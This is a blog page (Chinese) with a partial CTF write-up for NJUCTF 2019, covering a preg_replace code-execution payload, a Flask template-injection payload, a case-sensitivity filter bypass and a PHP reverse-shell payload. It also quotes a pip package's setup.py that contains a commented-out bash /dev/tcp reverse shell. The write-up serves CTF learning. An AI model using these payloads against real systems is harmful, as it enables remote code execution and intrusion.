@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,web,南京邮电CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言虽然拿了一血但是是靠手速哈哈。 web-replace既然这么出了一定是考replace.  提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。 首页三个框框: 目测是对应preg_replace 三个参数。  preg_replace ( mixed $pattern , mixed $replacement , mixed $subj">
+<meta name="keywords" content="CTF,web,南京邮电CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJUCTF2019-部分wp">
+<meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUCTF2019.html">
+<meta property="og:site_name" content="Jesen&#39;s Blog">
+<meta property="og:description" content="前言虽然拿了一血但是是靠手速哈哈。 web-replace既然这么出了一定是考replace.  提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。 首页三个框框: 目测是对应preg_replace 三个参数。  preg_replace ( mixed $pattern , mixed $replacement , mixed $subj">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193302903.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193404646.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193919224.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193932138.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193949934.png">
+<meta property="og:updated_time" content="2019-11-24T12:04:27.937Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20191124193302903.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://mrjesen.github.io/2019/11/24/NJUCTF2019.html"/>
+
+
+
+
+
+  <title>NJUCTF2019-部分wp | Jesen's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jesen's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">想要人前装逼,必须得在人后学习</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/#" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/#%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/#%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/#" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://mrjesen.github.io/2019/11/24/NJUCTF2019.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jesen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/jesen.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jesen's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">NJUCTF2019-部分wp</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+			
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-24T19:28:28+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/11/24/NJUCTF2019.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/24/NJUCTF2019.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然拿了一血但是是靠手速哈哈。</p>
+<h1 id="web-replace"><a href="#web-replace" class="headerlink" title="web-replace"></a>web-replace</h1><p>既然这么出了一定是考replace.</p>
+<p><img src="/images/image-20191124193302903.png" alt="image-20191124193302903"></p>
+<p>提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。</p>
+<p>首页三个框框:<img src="/images/image-20191124193404646.png" alt="image-20191124193404646"></p>
+<p>目测是对应preg_replace 三个参数。</p>
+<p> <code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code> </p>
+<p>总的来说就是: <code>preg_replace(‘原来的文本’,‘替换的单词’,‘新单词’)</code></p>
+<p>那么构造payload: <code>sub=jesen666&amp;pat=.*&amp;rep=eval($_POST[a])&amp;a=system(&#39;cat /flag&#39;);</code></p>
+<p>post过去即可。。</p>
+<h1 id="web-flask"><a href="#web-flask" class="headerlink" title="web-flask"></a>web-flask</h1><p>这题过于简单。。<img src="/images/image-20191124193919224.png" alt="image-20191124193919224"></p>
+<p>进门这个点击以后看看，<img src="/images/image-20191124193932138.png" alt="image-20191124193932138"></p>
+<p>修改以下url:<img src="/images/image-20191124193949934.png" alt="image-20191124193949934"></p>
+<p>漏洞已经出现，这里直接放出payload。毕竟原理在网上已经有。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/base1&#123;&#123;request[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>].__base__.__base__.__base__[<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">60</span>][<span class="string">'__in'</span>+<span class="string">'it__'</span>][<span class="string">'__'</span>+<span class="string">'glo'</span>+<span class="string">'bal'</span>+<span class="string">'s__'</span>][<span class="string">'__bu'</span>+<span class="string">'iltins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("cat /f"+"lag").re'</span>+<span class="string">'ad()'</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意它过滤了flag字符，所以需要拆开flag后用+链接。。。</p>
+<h1 id="web-hacker-backdoor"><a href="#web-hacker-backdoor" class="headerlink" title="web-hacker_backdoor"></a>web-hacker_backdoor</h1><p>给出代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'useful'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$usrful = $_GET[<span class="string">'useful'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    $dangerous = get_defined_functions();</span><br><span class="line">    array_push($dangerous[<span class="string">"internal"</span>], <span class="string">'eval'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($dangerous[<span class="string">"internal"</span>] <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($a,$bad) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($usrful))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf($code))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"oh,不能输入这些函数哦 :) "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析以下：需要get传入code和useful参数，useful参数需要是系统已经存在的文件。这里使用file:///etc/passwd</p>
+<p>$dangerous数组，把内置函数全部取出，并加入eval和assert来阻止执行。</p>
+<h2 id="研究绕过"><a href="#研究绕过" class="headerlink" title="研究绕过"></a>研究绕过</h2><p>这里我们可以在网上百度得到strpos一般是用数组绕过的,但是我在做题时候发现，我没有成功，紧接着查阅php.net文档，发现strpos是大小写敏感的。</p>
+<p>那么就简单了。构造  <code>/?code=PhPinfO();&amp;useful=file:///etc/passwd</code>成功绕过。</p>
+<h2 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h2><p>发现禁用了大多数函数，但是没有禁用fsockopen,proc_close和proc_open,那么完全可以反弹shell。</p>
+<p>反弹代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(<span class="string">'xxxxx'</span>,<span class="string">'xxx'</span>);<span class="comment">//ip and port</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(<span class="number">0</span> =&gt; $sock,<span class="number">1</span> =&gt; $sock,<span class="number">2</span> =&gt; $sock);</span><br><span class="line">$process=proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：<code>/?code=EVAL($_GET[a]);&amp;useful=file:///etc/passwd&amp;a=$sock=fsockopen(&#39;xx&#39;,&#39;xxxxx&#39;);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process=proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);</code></p>
+<p>这里为了观赏性，a是urldecode之后的，在利用的时候需要使用urlencode。</p>
+<h1 id="misc-pip-install"><a href="#misc-pip-install" class="headerlink" title="misc-pip install"></a>misc-pip install</h1><p>官方给了个命令让安装<code>pip install --user nctf-2019-installme</code></p>
+<p>果断安装，安装后发现源码只有：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Believe it or not. Flag is already in your machine. Can you find it?'</span></span><br></pre></td></tr></table></figure>
+
+<p>那么只能去pypi官网，去官网查找<code>nctf-2019-installme</code>包，下载zip源码。在setup.py中发现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system</span><br><span class="line"></span><br><span class="line">tmp_file = tempfile.gettempdir() + path.sep + <span class="string">'.f14g_is_here'</span></span><br><span class="line">f = open(tmp_file, <span class="string">'w'</span>)</span><br><span class="line">f.write(<span class="string">'TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9'</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># system('bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1')</span></span><br><span class="line"><span class="comment"># Ohhhh, that a joke. I won't do that. </span></span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">'nctf_2019_installme'</span>,</span><br><span class="line">    version=<span class="number">0.2</span>,</span><br><span class="line">    description=(</span><br><span class="line">        <span class="string">'Get flagggggggggg!'</span></span><br><span class="line">    ),</span><br><span class="line">    author=<span class="string">'rmb122'</span>,</span><br><span class="line">    author_email=<span class="string">'abuse@anti-spam.cn'</span>,</span><br><span class="line">    license=<span class="string">'GPLv3.0'</span>,</span><br><span class="line">    packages=find_packages(),</span><br><span class="line">    platforms=[<span class="string">"all"</span>],</span><br><span class="line">    keywords=[<span class="string">'nctf'</span>, <span class="string">'getflag'</span>],</span><br><span class="line">    url=<span class="string">'http://www.google.com'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>解码base64<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>即可得到flag.</p>
+<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>还是很难的（对于我这种萌新来说），最可惜的结束phar那道题，有反序列化，但是没有找到对应的危险类，只有一个孤零零的curl。。。。静等赛后官方wp。唉唉唉。。。</p>
+<p>但是。。。我很开心 哈哈哈。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF/" rel="tag"># 南京邮电CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/11/somewebTricks.html" rel="next" title="一些web的小Tricks">
+                <i class="fa fa-chevron-left"></i> 一些web的小Tricks
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/jesen.jpg"
+                alt="Jesen" />
+            
+              <p class="site-author-name" itemprop="name">Jesen</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/#%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/mrjesen" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jesen@protonmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/xlv5/#" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-tags"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/#" target="_blank" title="微博">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>微博</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yml-sec.top/" title="yemoli" target="_blank">yemoli</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-replace"><span class="nav-number">2.</span> <span class="nav-text">web-replace</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-flask"><span class="nav-number">3.</span> <span class="nav-text">web-flask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-hacker-backdoor"><span class="nav-number">4.</span> <span class="nav-text">web-hacker_backdoor</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#研究绕过"><span class="nav-number">4.1.</span> <span class="nav-text">研究绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#成功执行命令"><span class="nav-number">4.2.</span> <span class="nav-text">成功执行命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc-pip-install"><span class="nav-number">5.</span> <span class="nav-text">misc-pip install</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结束"><span class="nav-number">6.</span> <span class="nav-text">结束</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jesen</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz',
+        appKey: 'Q4E9nvCrlFLKhPtPLwXlkkxb',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
